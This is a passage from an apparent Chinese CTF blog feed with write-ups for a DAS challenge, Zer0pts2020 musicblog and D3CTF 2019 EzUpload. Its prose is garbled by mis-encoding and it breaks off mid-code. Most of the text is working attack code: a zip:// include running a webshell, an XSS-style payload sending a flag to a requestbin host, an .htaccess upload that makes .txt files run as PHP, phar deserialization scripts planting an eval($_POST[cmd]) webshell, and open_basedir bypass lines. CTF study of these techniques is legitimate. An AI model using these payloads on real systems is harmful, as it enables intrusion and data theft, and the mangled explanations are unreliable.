src="/2020/08/15/DASfinaltest/12.png" class=""><p>å½“ç„¶ä¹Ÿå¯ä»¥æ‰¾åˆ°è´­ä¹°hintçš„jsä»£ç ï¼Œåœ¨å‰ç«¯ç›´æ¥è¿è¡Œæ‹¿åˆ°adminçš„å¯†ç </p><p>æ³¨å†Œç™»å½•ï¼Œä¼šå‘ç°æƒé™å˜ä¸ºäº†è¶…çº§ç®¡ç†å‘˜ï¼Œè¿˜å¤šäº†ä¸ªé»‘äº§è´¦æˆ·ä¿¡æ¯å¤„ç†é¡µé¢</p><img src="/2020/08/15/DASfinaltest/14.png" class=""><p>åœ¨é»‘äº§è´¦æˆ·ä¿¡æ¯å¤„ç†é¡µé¢å¯ä»¥ä¸Šä¼ docxæ–‡ä»¶ï¼Œè¿™æœ¬èº«å°±æ˜¯ä¸€ä¸ªå‹ç¼©åŒ…æ–‡ä»¶ï¼ŒçŒœæµ‹å¯ä»¥ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç”±äºä¸Šä¼ çš„æ˜¯å‹ç¼©åŒ…æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥å¯ä»¥åˆ©ç”¨zip://ä¼ªåè®®è¿›è¡ŒåŒ…å«shell</p><img src="/2020/08/15/DASfinaltest/13.png" class=""><p>å°†æ–‡ä»¶ä¸Šä¼ ï¼Œä¼ªåè®®åŒ…å«</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;phpinfo();</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/15.png" class=""><p>ä¸‹é¢å°±æ˜¯è¦æ‰¾åˆ°flagäº†ï¼Œç”¨findå‘½ä»¤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page&#x3D;zip:&#x2F;&#x2F;.&#x2F;uploads&#x2F;6ce5cdd6b7d89172f662e7b7bf0c08a09be20e47.docx%23aaa&amp;a&#x3D;system(&#39;find &#x2F; -name flag&#39;);</span><br></pre></td></tr></table></figure><img src="/2020/08/15/DASfinaltest/16.png" class=""><p>æ‰¾åˆ°ä¹‹åæ‹¿åˆ°flag</p><img src="/2020/08/15/DASfinaltest/17.png" class="">]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;EZSQL&quot;&gt;&lt;a href=&quot;#EZSQL&quot; class=&quot;headerlink&quot; title=&quot;EZSQL&quot;&gt;&lt;/a&gt;EZSQL
    
    </summary>
    
    
    
      <category term="DAS" scheme="http://yoursite.com/tags/DAS/"/>
    
  </entry>
  
  <entry>
    <title>remaining</title>
    <link href="http://yoursite.com/2020/08/06/remaining/"/>
    <id>http://yoursite.com/2020/08/06/remaining/</id>
    <published>2020-08-06T04:48:04.000Z</published>
    <updated>2020-08-10T04:34:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Zer0pts2020-musicblog"><a href="#Zer0pts2020-musicblog" class="headerlink" title="[Zer0pts2020]musicblog"></a>[Zer0pts2020]musicblog<a id="more"></a></h2><h2 id="çŸ¥è¯†ç‚¹"><a href="#çŸ¥è¯†ç‚¹" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li>CSPé™åˆ¶</li><li>strip_tagsæ¼æ´åˆ©ç”¨</li></ul><h2 id="è§£é¢˜æ­¥éª¤"><a href="#è§£é¢˜æ­¥éª¤" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><p>æºç é‡Œçš„worker.jsä¸­</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> crawl = <span class="keyword">async</span> (url) =&gt; &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Query! (<span class="subst">$&#123;url&#125;</span>)`</span>);</span><br><span class="line">    <span class="keyword">const</span> page = <span class="keyword">await</span> browser.newPage();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">await</span> page.setUserAgent(flag);</span><br><span class="line">        <span class="keyword">await</span> page.goto(url, &#123;</span><br><span class="line">            waitUntil: <span class="string">'networkidle0'</span>,</span><br><span class="line">            timeout: <span class="number">3</span> * <span class="number">1000</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">        page.click(<span class="string">'#like'</span>);</span><br><span class="line">        <span class="keyword">await</span> page.waitForNavigation(&#123;<span class="attr">timeout</span>: <span class="number">3000</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err)&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(err);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">await</span> page.close();</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`[+] Done! (<span class="subst">$&#123;url&#125;</span>)`</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°flagåœ¨UAå­—æ®µä¸­ï¼Œadminä¼šè‡ªåŠ¨ç‚¹å‡»likeæ ‡ç­¾</p><p>åœ¨util.phpä¸­ï¼Œå¯¹èƒ½ç”¨çš„æ ‡ç­¾åšäº†é™åˆ¶ï¼Œåªèƒ½ç”¨<code>&lt;audio&gt;</code>,æŸ¥æ‰¾strip_tagsï¼Œå½“strip_tagsä¸ç™½åå•æ ‡ç­¾ä¸€èµ·ä½¿ç”¨æ—¶ï¼Œphpå…è®¸åœ¨ç™½åå•æ ‡ç­¾åç§°å†…å‡ºç°æ–œæ ï¼ˆâ€œ /â€ï¼‰ï¼Œå¹¶å°†å…¶å¤åˆ¶åˆ°ç»“æœä¸­ã€‚(<a href="https://bugs.php.net/bug.php?id=78814" target="_blank" rel="noopener">https://bugs.php.net/bug.php?id=78814</a>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render_tags</span><span class="params">($str)</span> </span>&#123;</span><br><span class="line">  $str = preg_replace(<span class="string">'/\[\[(.+?)\]\]/'</span>, <span class="string">'&lt;audio controls src="\\1"&gt;&lt;/audio&gt;'</span>, $str);</span><br><span class="line">  $str = strip_tags($str, <span class="string">'&lt;audio&gt;'</span>); <span class="comment">// only allows `&lt;audio&gt;`</span></span><br><span class="line">  <span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥åœ¨<code>&lt;a/udio&gt;</code>å¯ä»¥ä½¿ç”¨aæ ‡ç­¾</p><p>åˆå­˜åœ¨CSPï¼Œä¸èƒ½è·¨åŸŸè¯·æ±‚ï¼Œå¯ä»¥ç”¨aæ ‡ç­¾è¿›è¡Œè¯·æ±‚</p><img src="/2020/08/06/remaining/1.png" class=""><p>å¯ä»¥çœ‹åˆ°contentæ˜¯å¯æ§çš„ï¼Œä¸”ç”¨åˆ°äº†render_tagsæ–¹æ³•</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a&#x2F;udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br><span class="line">æµè§ˆå™¨è§£æåå°±æˆäº†</span><br><span class="line">&lt;a udio id&#x3D;like href&#x3D;http:&#x2F;&#x2F;http.requestbin.buuoj.cn&#x2F;1b38hj71&gt;aa</span><br></pre></td></tr></table></figure><p>è¿™æ ·flagå°±ä¼šè¢«å¸¦å‡ºäº†</p><img src="/2020/08/06/remaining/2.png" class=""><h2 id="D3CTF-2019-EzUpload-ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥"><a href="#D3CTF-2019-EzUpload-ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥" class="headerlink" title="[D3CTF 2019]EzUpload(ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥)"></a>[D3CTF 2019]EzUpload(ç¯å¢ƒé—®é¢˜æœªæ‰“é€šï¼Œä¸€ä¸ªæ—©ä¸Šæ²¡æ•´å‡ºæ¥)</h2><h2 id="çŸ¥è¯†ç‚¹-1"><a href="#çŸ¥è¯†ç‚¹-1" class="headerlink" title="çŸ¥è¯†ç‚¹"></a>çŸ¥è¯†ç‚¹</h2><ul><li>pharåè®®</li><li>åºåˆ—åŒ–</li><li>.htaccessæ–°å½¢å¼</li><li>ä»£ç å®¡è®¡</li></ul><h2 id="è§£é¢˜æ­¥éª¤-1"><a href="#è§£é¢˜æ­¥éª¤-1" class="headerlink" title="è§£é¢˜æ­¥éª¤"></a>è§£é¢˜æ­¥éª¤</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($url,$filename)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;url = $url;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename  =  $filename;</span><br><span class="line">        <span class="keyword">if</span> (!file_exists(<span class="keyword">$this</span>-&gt;userdir)) &#123;</span><br><span class="line">            mkdir(<span class="keyword">$this</span>-&gt;userdir, <span class="number">0777</span>, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkdir</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;userdir != <span class="string">"upload/"</span> . md5($_SERVER[<span class="string">"REMOTE_ADDR"</span>])) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkurl</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $r = parse_url(<span class="keyword">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">isset</span>($r[<span class="string">'scheme'</span>]) || preg_match(<span class="string">"/file|php/i"</span>,$r[<span class="string">'scheme'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">checkext</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'..'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (stristr(<span class="keyword">$this</span>-&gt;filename,<span class="string">'/'</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        $ext = substr(<span class="keyword">$this</span>-&gt;filename, strrpos(<span class="keyword">$this</span>-&gt;filename, <span class="string">"."</span>) + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/ph/i"</span>, $ext))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkurl();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        $content = file_get_contents(<span class="keyword">$this</span>-&gt;url,<span class="keyword">NULL</span>,<span class="keyword">NULL</span>,<span class="number">0</span>,<span class="number">2048</span>);</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/\&lt;\?|value|on|type|flag|auto|set|\\\\/i"</span>, $content))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'hacker!!!'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename,$content);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">remove</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkdir();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checkext();</span><br><span class="line">        <span class="keyword">if</span> (file_exists(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            unlink(<span class="keyword">$this</span>-&gt;userdir.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">count</span><span class="params">($dir)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ($dir === <span class="string">''</span>)&#123;</span><br><span class="line">            $num = count(scandir(<span class="keyword">$this</span>-&gt;userdir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            $num = count(scandir($dir)) - <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($num &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you have $num files"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you don't have file"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> implode(<span class="string">" "</span>,scandir(<span class="keyword">__DIR__</span>.<span class="string">"/"</span>.<span class="keyword">$this</span>-&gt;userdir));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $string = <span class="string">"your file in : "</span>.<span class="keyword">$this</span>-&gt;userdir;</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;filename.<span class="string">".txt"</span>, $string);</span><br><span class="line">        <span class="keyword">echo</span> $string;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'action'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'url'</span>]) || !<span class="keyword">isset</span>($_POST[<span class="string">'filename'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$dir = <span class="keyword">new</span> dir($_POST[<span class="string">'url'</span>],$_POST[<span class="string">'filename'</span>]);</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'action'</span>] === <span class="string">"upload"</span>) &#123;</span><br><span class="line">    $dir-&gt;upload();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"remove"</span>) &#123;</span><br><span class="line">    $dir-&gt;remove();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">elseif</span> ($_POST[<span class="string">'action'</span>] === <span class="string">"count"</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($_POST[<span class="string">'dir'</span>]))&#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count(<span class="string">''</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> $dir-&gt;count($_POST[<span class="string">'dir'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡checkåæ–‡ä»¶å†™å…¥ã€‚æ–‡ä»¶å†…å®¹ä»ä¼ å…¥çš„urlè¯»å–ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ˜¯å…è®¸è¯»å–è¿œç¨‹æ–‡ä»¶çš„ï¼Œå› æ­¤å¯ä»¥åœ¨vpsä¸Šè®¾ç½®æ–‡ä»¶ã€‚</p><p><code>checkdir()</code>æ£€æŸ¥äº†<code>$this-&gt;userdir</code>ï¼Œå…ˆæ”¾ç€</p><p><code>checkurl()</code>ç¦æ­¢äº†urlå‡ºç°<code>php|file</code>ï¼Œé˜²æ­¢ä½¿ç”¨ä¸¤ç§ä¼ªåè®®è¯»å–æœ¬åœ°æ–‡ä»¶ï¼Œé™¤äº†vpsä¸Šè®¾ç½®æ–‡ä»¶è¿˜å¯ä»¥ä½¿ç”¨<code>data://</code>åè®®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checkext()&#96;ç¦æ­¢äº†&#96;filename&#96;å‡ºç°&#96;..&#96;ã€&#96;&#x2F;&#96;ã€&#96;ph&#96;ï¼Œå¯ä»¥æƒ³åˆ°&#96;.htaccess</span><br></pre></td></tr></table></figure><p>ä¸€èˆ¬çš„.htaccessæ ¼å¼</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;FilesMatch &quot;1.jpg&quot;&gt;</span><br><span class="line"> SetHandler application&#x2F;x-httpd-php</span><br><span class="line">&lt;&#x2F;FilesMatch&gt;</span><br></pre></td></tr></table></figure><p>æˆ–è€…æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application&#x2F;x-httpd-php .txt</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜æœ‰å¦ä¸€ç§</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddHandler php7-script .txt</span><br></pre></td></tr></table></figure><p>å†™å…¥çš„.htaccess</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action&#x3D;upload&amp;url&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,QWRkSGFuZGxlciBwaHA3LXNjcmlwdCAudHh0&amp;filename&#x3D;.htaccess</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¦è·å–<code>upload/</code>ç›®å½•çš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡<code>__destruct()</code>ä¸­çš„ <code>echo $string;</code> è§¦å‘<code>__toString()</code>ï¼Œæ‰“å°<code>__DIR__</code>ï¼Œpharå¯ä»¥è¿›è¡Œgzipå‹ç¼©ï¼Œä»è€Œç»•è¿‡å¯¹ä¸€äº›å­—ç¬¦çš„æ£€æŸ¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $userdir;</span><br><span class="line">    <span class="keyword">public</span> $url;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$d = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir = <span class="keyword">new</span> dir();</span><br><span class="line">$d-&gt;userdir-&gt;userdir = <span class="string">"../"</span>;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($d));</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">"somnus2.phar"</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;setStub(<span class="string">"GIF89A"</span>.<span class="string">"__HALT_COMPILER();"</span>); <span class="comment">//è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´ç”¨ä»¥æ¬ºéª—æ£€æµ‹</span></span><br><span class="line">$phar-&gt;setMetadata($d); <span class="comment">//å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest</span></span><br><span class="line">$phar-&gt;addFromString(<span class="string">"test.jpg"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿›è¡Œgzipå‹ç¼©ï¼Œå†æ”¾åˆ°å†…ç½‘é¶æœºçš„webæœåŠ¡ä¸‹</p><p>å…ˆä¸Šä¼ </p><img src="/2020/08/06/remaining/3.png" class=""><p>å†ç”¨pharè§¦å‘ååºåˆ—åŒ–</p><img src="/2020/08/06/remaining/4.png" class=""><p>åŒæ ·çš„ï¼Œæ¥ä¸‹æ¥å†ç»å¯¹è·¯å¾„ä¸­å†™å…¥shell</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> $userdir;</span><br><span class="line">      <span class="keyword">public</span> $filename;</span><br><span class="line">      <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="string">'/var/www/html/45f6a4a57549a572/upload/adeee0c170ad4ffb110df0cde294aecd/shell'</span>;<span class="comment">//è¿™é‡Œä¸éœ€è¦åŠ åç¼€</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;userdir = <span class="string">'aaaaaaaaaaa&lt;?php phpinfo();eval($_POST[cmd]);?&gt;aaaaaaa'</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $a = <span class="keyword">new</span> dir();</span><br><span class="line">    <span class="comment">// var_dump($a);</span></span><br><span class="line">    @unlink(<span class="string">"phar.phar"</span>);</span><br><span class="line">    $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line">    $phar-&gt;setMetadata($a); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line">    $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‰åçå‡‘çš„å­—ç¬¦ä¸²ä¸ºäº†ç»•è¿‡è¿‡æ»¤</p><img src="/2020/08/06/remaining/5.png" class=""><p>åˆ°è¿™é‡Œèƒ½è®¿é—®å°±èƒ½çœ‹åˆ°phpinfoé¡µé¢äº†ï¼Œä½†æ˜¯ç¯å¢ƒé—®é¢˜æ²¡æˆåŠŸï¼Œé‚£ä¸ªä¸Šä¼ åçš„ç›®å½•ä¸èƒ½è®¿é—®</p><p>æœ€åè¿˜æœ‰ä¸€æ­¥å°±æ˜¯ç»•è¿‡<code>open_basedirå’Œdisable_function</code></p><p>ç›´æ¥ç”¨èšå‰‘çš„æ’ä»¶å°±èƒ½ç»•è¿‡æ‹¿åˆ°flagäº†ï¼Œè¿™é‡Œå°±æ²¡å›¾èƒ½è´´äº†ï¼Œæˆ–è€…æ˜¯</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>,<span class="string">'/'</span>);var_dump(scandir(<span class="string">'/'</span>));</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">'open_basedir'</span>, <span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);chdir(<span class="string">'..'</span>);ini_set(<span class="string">'open_basedir'</span>, <span class="string">'/'</span>);var_dump(show_source(<span 